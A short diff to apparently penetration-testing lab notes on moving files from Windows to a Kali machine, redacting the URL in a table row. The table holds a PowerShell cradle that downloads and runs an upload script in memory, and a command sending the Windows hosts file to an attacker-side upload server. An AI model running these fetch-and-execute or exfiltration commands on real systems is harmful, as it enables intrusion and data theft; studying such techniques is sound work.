@@ -95,7 +95,7 @@ More PowerShell cradles can be found at [Download Cradles](https://gist.github.c
 | Step | Command | Purpose |
 |------|---------|---------|
 | 1 | `python3 -m uploadserver` | Start an HTTP upload server on Kali |
-| 2 | `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')` | Load the PSUpload script into memory on Windows |
+| 2 | `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/PSUpload.ps1')` | Load the PSUpload script into memory on Windows |
 | 3 | `Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts` | Upload the Windows file to the Kali server |
 
 #### HTTP POST + Base64 Upload (Windows → Kali)
